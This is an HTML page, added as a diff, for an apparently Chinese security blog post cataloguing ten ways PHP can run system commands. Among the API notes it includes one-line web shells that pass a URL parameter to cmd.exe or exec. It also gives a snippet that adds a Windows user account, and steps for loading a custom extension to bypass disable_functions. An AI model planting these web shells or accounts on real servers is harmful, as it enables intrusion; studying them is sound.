@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+
+    
+
+    
+
+    <title>PHP 调用外部程序方法总结 | TinyMagicka</title>
+    <meta name="author" content="TinyMagicka" />
+    <meta name="version" content="1.0.0" />
+    <meta name="keywords" content="Android PWN" />
+    <meta name="description" content="目前一共收集了10种方式：exec()
+shell_exec() 或者 `cmd`
+system()
+passthru()
+popen()
+proc_open()
+pcntl_exec() //需要开启pcntl扩展
+COM组建：Wscript.Shell和Shell.Application
+dl() //通过加载自定义php扩展突破 disable_fucnitons指令的限制
+第十种请直接移步到freebuf  http://www.freebuf.com/articles/web/8280" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+    <meta name="baidu-site-verification" content="F0CXvmUgA9" />
+
+    
+    
+    <link rel="icon" href="/images/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+    <div class="app">
+        <header class="header clearfix">
+    <div id="nav" class="nav">
+    <button id="open-panel" class="open-panel"><i class="icon-library"></i></button>
+
+    <nav class="nav-inner">
+
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+        </li>
+        
+        
+        
+        <li class="nav-item nav-item-tag">
+            <a id="nav-tag" class="nav-link" href="#">标签</a>
+            <div id="nav-tags" class="nav-tag-wrap">
+                <i class="nav-tag-arrow"></i>
+                
+  <div class="widget-wrap">
+    <h3 class="widget-title">
+        <i class="icon-tag vm"></i>
+        <span class="vm">Tags</span>
+    </h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/">pwnable.tw</a></li></ul>
+    </div>
+  </div>
+
+
+            </div>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/archives">归档</a>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/about">关于</a>
+        </li>
+        
+        
+        
+
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+
+        
+        
+        
+        
+
+        
+        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#目前一共收集了10种方式："><span class="toc-number">1.</span> <span class="toc-text">目前一共收集了10种方式：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#1-exec"><span class="toc-number">2.</span> <span class="toc-text">1. exec</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-shell-exec-反斜杠"><span class="toc-number">3.</span> <span class="toc-text">2. shell_exec  \  (反斜杠)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-system"><span class="toc-number">4.</span> <span class="toc-text">3. system</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#4-passthru"><span class="toc-number">5.</span> <span class="toc-text">4. passthru</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#5-popen"><span class="toc-number">6.</span> <span class="toc-text">5. popen</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#6-proc-open"><span class="toc-number">7.</span> <span class="toc-text">6. proc_open</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#7-cntl-exec"><span class="toc-number">8.</span> <span class="toc-text">7. cntl_exec</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#8-COM组建-针对windwos环境下使用com组建"><span class="toc-number">9.</span> <span class="toc-text">8. COM组建(针对windwos环境下使用com组建)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#9-dl"><span class="toc-number">10.</span> <span class="toc-text">9.dl()</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#10-内核变量"><span class="toc-number">11.</span> <span class="toc-text">10.内核变量</span></a></li></ol>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content"><article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            PHP 调用外部程序方法总结
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="/2017/07/13/php_eval/">
+    
+    <i class="icon-calendar"></i>
+    
+    <time datetime="2017-07-13T12:46:25.000Z" itemprop="datePublished">2017-07-13</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag"></i>
+    <a class="article-tag-link" href="/tags/php/">php</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <h6 id="目前一共收集了10种方式："><a href="#目前一共收集了10种方式：" class="headerlink" title="目前一共收集了10种方式："></a>目前一共收集了10种方式：</h6><pre><code>exec()
+shell_exec() 或者 `cmd`
+system()
+passthru()
+popen()
+proc_open()
+pcntl_exec() //需要开启pcntl扩展
+COM组建：Wscript.Shell和Shell.Application
+dl() //通过加载自定义php扩展突破 disable_fucnitons指令的限制
+第十种请直接移步到freebuf  http://www.freebuf.com/articles/web/82801.html
+</code></pre><a id="more"></a>  
+<pre><code>（前面几个方式我为了偷懒直接修改自博客  
+http://www.cppblog.com/amazon/archive/2011/12/01/161281.aspx）
+</code></pre><h6 id="1-exec"><a href="#1-exec" class="headerlink" title="1. exec"></a>1. exec</h6><pre><code>原型：string exec ( string command [, array &amp;output [, int &amp;return_var]] )
+描述：所有输出结果将会保存到$output数组，返回值中是最后的输出结果（也就是output的最后一行 ），$return_var用来保存命令执行的状态码（用来检测成功或失败）。
+例子：$ret = exec(&quot;ls -al&quot;, $output, $var);
+</code></pre><h6 id="2-shell-exec-反斜杠"><a href="#2-shell-exec-反斜杠" class="headerlink" title="2. shell_exec  \  (反斜杠)"></a>2. shell_exec  \  <code></code>(反斜杠)</h6><pre><code>原型：string shell_exec ( string $cmd )
+</code></pre><h6 id="3-system"><a href="#3-system" class="headerlink" title="3. system"></a>3. system</h6><pre><code>原型：string system ( string command [, int &amp;return_var] )
+描述：执行给定的命令，返回最后的输出结果；第二个参数是可选的，用来得到命令执行后的状态码。
+例子：$ret = system(&quot;ls -al&quot;, $var);
+</code></pre><h6 id="4-passthru"><a href="#4-passthru" class="headerlink" title="4. passthru"></a>4. passthru</h6><pre><code>原型：void passthru (string command [, int return_var])
+描述：执行给定的命令，但不返回任何输出结果，而是直接输出到显示设备上；第二个参数可选，用来得到命令执行后的状态码。
+例子：passthru(&quot;ls -al&quot;, $var);
+</code></pre><h6 id="5-popen"><a href="#5-popen" class="headerlink" title="5. popen"></a>5. popen</h6><pre><code>原型：resource popen ( string command, string mode )
+描述：打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。 返回一个和 fopen() 所返回的相同的文件指针，只不过它是单向的（只能用于读或写）并且必须用 pclose() 来关闭。此指针可以用于 fgets()，fgetss() 和 fwrite()。 
+例子
+     1：$fd = popen(&quot;command&quot;, &apos;r&apos;); $ret = fgets($fd);
+     2：$fd = popen(&quot;systeminfo &gt;d:\\1.txt&quot;, &apos;r&apos;); pclose($fd);print(fgets(fopen(&quot;d:\\1.txt&quot;,&apos;r&apos;)));
+     3：$fd=popen(&quot;ipconfig&quot;,&apos;r&apos;);
+          while($s=fgets($fd)){
+                print_r($s);
+          }
+注意：只能打开单向管道，不是&apos;r&apos;就是&apos;w&apos;；并且需要使用pclose()来关闭。
+</code></pre><h6 id="6-proc-open"><a href="#6-proc-open" class="headerlink" title="6. proc_open"></a>6. proc_open</h6><pre><code>原型：resource proc_open ( string cmd, array descriptorspec, array &amp;pipes [, string cwd [, array env [, array other_options]]] )
+描述：与popen类似，但是可以提供双向管道。具体的参数读者可 以自己翻阅php manual
+注意：
+A. 后面需要使用proc_close()关闭资源，并且如果是pipe类型，需要用pclose()关闭句柄。
+B. proc_open打开的程序作为php的子进程，php退出后该子进程也会退出。
+例子：
+&lt;?php
+  $descriptorspec=array(  //这个索引数组用力指定要用proc_open创建的子进程的描述符
+     0=&gt;array(&apos;pipe&apos;,&apos;r&apos;), //STDIN
+     1=&gt;array(&apos;pipe&apos;,&apos;w&apos;),//STDOUT
+     2=&gt;array(&apos;pipe&apos;,&apos;w&apos;) //STDERROR
+  );
+  $handle=proc_open(&apos;dir&apos;,$descriptorspec,$pipes,NULL);
+  //$pipes中保存的是子进程创建的管道对应到 PHP 这一端的文件指针($descriptorspec指定的)
+  if(!is_resource($handle)){
+    die(&apos;proc_open failed&apos;);
+  }
+  //fwrite($pipes[0],&apos;ipconfig&apos;);
+  print(&apos;stdout:&lt;br/&gt;&apos;);
+  while($s=fgets($pipes[1])){
+     print_r($s);
+  }
+  print(&apos;===========&lt;br/&gt;stderr:&lt;br/&gt;&apos;);
+  while($s=fgets($pipes[2])){
+     print_r($s);
+  }
+  fclose($pipes[0]);
+  fclose($pipes[1]);
+  fclose($pipes[2]);
+  proc_close($handle);
+?&gt;
+</code></pre><h6 id="7-cntl-exec"><a href="#7-cntl-exec" class="headerlink" title="7. cntl_exec"></a>7. cntl_exec</h6><pre><code>原型：void pcntl_exec ( string $path [, array $args [, array $envs ]] )
+描述：(PHP 4 &gt;= 4.2.0, PHP 5, PHP 7)
+pcntl_exec — 在当前进程空间执行以给定参数执行指定程序。
+pcntl是linux下的一个扩展，可以支持php的多线程操作。
+    参数:
+         path: 必须是可执行二进制文件路径或一个在文件第一行指定了一个可执行文件路径
+                  标头的脚本（比如文件第一行是#!/usr/local/bin/perl的perl脚本）。 更多的
+                  信息请查看您系统的execve（2）手册。
+         args:  一个要传递给程序的参数的字符串数组。
+         envs: 一个要传递给程序作为环境变量的字符串数组。这个数组是 key =&gt; value格
+                   式的，key代表要传递的环境变量的名称，value代表该环境变量值。
+    返回值:当发生错误时返回 FALSE ，没有错误时没有返回。
+</code></pre><h6 id="8-COM组建-针对windwos环境下使用com组建"><a href="#8-COM组建-针对windwos环境下使用com组建" class="headerlink" title="8. COM组建(针对windwos环境下使用com组建)"></a>8. COM组建(针对windwos环境下使用com组建)</h6><pre><code>原型：
+   Wscript.Shell-&gt;exec(command)  //
+   Shell.Application-&gt;ShellExecute(appName,appArgs,appPath) //
+   Shell.Application-&gt;open(appPath) //要填写程序绝对路径，并且应该没有办法加参数
+   Shell.Application-&gt;NameSpace(&quot;C:\Windows\System32&quot;)-&gt;Items()-&gt;item(&quot;cmd.exe&quot;)-&gt;invokeverb()
+   Shell.Application-&gt;NameSpace(&quot;C:\Windows\System32&quot;)-&gt;Items()-&gt;item(&quot;cmd.exe&quot;)-&gt;invokeverbEx()
+描述：在windwos下，并且在php中开启com组建扩展之后可以使用这种方法（打开方式自行百度）
+         彻底的解决方案是 直接删除System32目录下wshom.ocx文件
+例子：
+&lt;?php
+$phpwsh=new COM(&quot;Wscript.Shell&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  
+$exec=$phpwsh-&gt;exec(&quot;cmd.exe /c &quot;.$_GET[&apos;c&apos;].&quot;&quot;);  
+$stdout = $exec-&gt;StdOut();  
+$stroutput = $stdout-&gt;ReadAll();  
+echo $stroutput;  
+?&gt;
+
+&lt;?php
+$phpwsh=new COM(&quot;Shell.Application&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  
+$exec=$phpwsh-&gt;ShellExecute(&quot;net&quot;,&quot; user tiny tiny  /add&quot;);
+//$exec=$phpwsh-&gt;ShellExecute(&quot;cmd&quot;,&quot;/c net user tiny tiny  /add&quot;);
+?&gt;
+
+&lt;?php
+$phpwsh=new COM(&quot;Shell.Application&quot;) or die(&quot;Create Wscript.Shell Failed!&quot;);  
+$exec=$phpwsh-&gt;open(&quot;c:\\windows\\system32\\cmd.exe&quot;);
+?&gt;
+
+&lt;?php
+$a=new COM(&quot;Shell.Application&quot;);
+$a-&gt;NameSpace(&quot;C:\Windows\System32&quot;)-&gt;Items()-&gt;item(&quot;cmd.exe&quot;)-&gt;invokeverb();
+?&gt;
+
+&lt;?php
+$a=new COM(&quot;Shell.Application&quot;);
+$a-&gt;NameSpace(&quot;C:\Windows\System32&quot;)-&gt;Items()-&gt;item(&quot;cmd.exe&quot;)-&gt;invokeverbEx();
+?&gt;
+</code></pre><h6 id="9-dl"><a href="#9-dl" class="headerlink" title="9.dl()"></a>9.dl()</h6><pre><code>要求：php没有开启安全模式，并且enable_dl选项为on，并且php版本支持dl函数
+       （在 PHP 5.3 里，此函数被某些 SAPI 移除了，也就是没有这个函数？）
+说明：extension_dir选项可以指定扩展模块的目录，但是我们可以使用相对路径的方式绕过
+原理：自己编写扩展，然后使用dl加载此扩展。
+举例（linux）：
+     准备工作：
+          自行上网下载apache和相近版本的php源码，按照apache和php的官方文档进行安装。
+          我们主要需要三个文件:phpize，php-config和ext_skel：在正确安装好了apache和php之后，
+          phpize和php-config将被安装（可以自行find），而ext_skel则是是在php源码中的ext目录中。
+          ext_skel是php源码包中的用来帮助制作扩展的程序。
+1）转到php-x.x.xx/ext中首先新建xxx.skel文件，里面填写要制作的扩展中的函数原型，例如：
+             string  exec(string str)
+2）执行命令：./ext_skel --extname=tinymin  --proto=xxx.skel  之后便生成了tinymin目录，
+             里面则是扩展所需要的文件
+3）cd tinymin
+4）vi config.m4   
+将 config.m4文件里面
+dnl PHP_ARG_WITH(myext, for myext support,
+dnl Make sure that the comment is aligned:
+dnl [  --with-myext             Include myext support])
+修改成
+PHP_ARG_WITH(myext, for myext support,
+[  --with-myext             Include myext support])
+5）vi tinymin.c
+将PHP_FUNCTION(exec)后面的大括号里面的代码的最后一行删除，并写上自己的代码，修改后如：PHP_FUNCTION(haha)
+      {
+    char *str = NULL;
+    int argc = ZEND_NUM_ARGS();
+    int str_len;
+
+    if (zend_parse_parameters(argc TSRMLS_CC, &quot;s&quot;, &amp;str, &amp;str_len) == FAILURE) 
+        return;
+
+    return system(str);
+       }
+6）找到phpize:find / -name &quot;phpize&quot; 然后运行一下phpize:
+/my_lamp/php/bin/phpize
+7) 同样方式找到php-config,然后运行configure：
+./configure --with-php-config=/my_lamp/php/bin/php-config
+8）make&amp;&amp;make install 
+   之后便在自己的php扩展目录中生成了扩展tinymin.so
+   在目标服务器上面上传tinymin.so（不一定要在它的php扩展目录中，因为可以使用相对路径）
+   用法例如：
+   &lt;?php
+    dl(&quot;../../../../../tmp/tinymin.so&quot;);
+    echo exec($_GET[&apos;cmd&apos;]);
+   ?&gt;
+   这种方法也很老了，我在自己的的kali2上面尝试这样做的时候提示没有dl这个函数，具体原因参见php manual
+   windows上应该也是一样的原理。不过没有试过
+</code></pre><h6 id="10-内核变量"><a href="#10-内核变量" class="headerlink" title="10.内核变量"></a>10.内核变量</h6><pre><code>http://www.freebuf.com/articles/web/82801.html
+ 目前我还不是很清楚这种方式。。。。毛子果然厉害
+</code></pre>
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="disqus_thread">
+        <p class="comment-tips">国内查看评论需要代理~</p>
+    </div>
+    <script>
+    window.disqus_config = function () {
+        this.language = 'zh';
+        this.page.url = 'http://yoursite.com/2017/07/13/php_eval/';
+        this.page.title = 'PHP 调用外部程序方法总结';
+        this.page.identifier = '2017/07/13/php_eval/';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://name.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</div>
+        <footer class="footer">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+</footer>
+
+<script type="text/javascript" src="//s13.cnzz.com/z_stat.php?id=1234567890&amp;web_id=1234567890"></script>
+
+
+    </div>
+
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="/js/scrollspy.min.js"></script>
+    
+    <script type="text/javascript">
+        $(function() {
+            var nodes = {
+                nav: $('#nav'),
+                aside: $('#aside'),
+                navTags: $('#nav-tags')
+            };
+
+            $('#open-panel, #aside-mask').on('click', function() {
+                nodes.aside.toggleClass('panel-show');
+            });
+            $('#nav-tag').on('click', function(event) {
+                event.preventDefault();console.log(nodes.navTags.attr('class'))
+                nodes.navTags.toggleClass('tag-show');console.log(nodes.navTags.attr('class'))
+            })/*.hover(function() {
+                nodes.navTags.addClass('tag-show');
+            }, function() {
+                nodes.navTags.removeClass('tag-show');
+            });*/
+
+            
+            $(document.body).scrollspy({target: '#aside-inner'});
+            
+        });
+    </script>
+
+</body>
+</html>
